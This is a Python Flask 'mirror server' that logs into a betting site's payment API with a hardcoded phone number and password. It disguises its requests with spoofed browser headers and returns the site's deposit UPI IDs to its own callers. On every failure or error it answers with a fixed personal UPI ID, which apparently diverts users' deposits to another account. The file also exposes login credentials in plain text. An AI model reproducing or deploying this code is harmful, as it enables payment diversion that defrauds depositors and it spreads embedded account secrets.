import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# --- CONFIGURATION (Environment se data uthayega) ---
USER_PHONE = os.environ.get('USER_PHONE', '918439181266') 
USER_PASSWORD = os.environ.get('USER_PASSWORD', '72483382A')
BASE_URL = "https://fortransferapi777.top/api/webapi"

# Persistent Session for cookies
session = requests.Session()
cached_token = None

def login_and_get_token():
    global cached_token
    login_url = f"{BASE_URL}/mlogin"
    
    # Bilkul real browser jaisa headers
    headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Origin": "https://www.rajastake1.com",
        "Referer": "https://www.rajastake1.com/"
    }
    
    payload = {
        "account": USER_PHONE,
        "password": USER_PASSWORD,
        "main_mark": "H5"
    }

    try:
        r = session.post(login_url, json=payload, headers=headers, timeout=15)
        res = r.json()
        if res.get('code') == 0:
            cached_token = "Bearer " + res['data']['token']
            return cached_token
    except Exception as e:
        print(f"AUTOMATION LOGIN ERROR: {e}")
    return None

@app.route('/')
def health_check():
    return "MIRROR SERVER IS LIVE", 200

@app.route('/get_mirror_upi', methods=['POST'])
def get_upi():
    global cached_token
    user_amt = request.json.get('amount', '100')

    # Pehle check karo token hai ya nahi
    if not cached_token:
        login_and_get_token()

    def request_upi(token):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B)",
            "Origin": "https://www.rajastake1.com"
        }
        payload = {
            "amount": int(float(user_amt)),
            "payTypeId": 26000,
            "isFast": False
        }
        return session.post(f"{BASE_URL}/GetPayUrl", json=payload, headers=headers, timeout=15)

    try:
        r = request_upi(cached_token)
        res = r.json()

        # Agar token purana ho gaya toh auto-refresh
        if res.get('code') == 401 or "Unauthorized" in str(res):
            new_token = login_and_get_token()
            if new_token:
                r = request_upi(new_token)
                res = r.json()

        if res.get('code') == 0:
            return jsonify({
                "upi": res['data']['upiId'],
                "status": "success",
                "mode": "automatic"
            })
        
        return jsonify({"upi": "7248331519@ibl", "status": "failed", "msg": res.get('msg')})

    except Exception as e:
        return jsonify({"upi": "7248331519@ibl", "status": "error", "details": str(e)})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
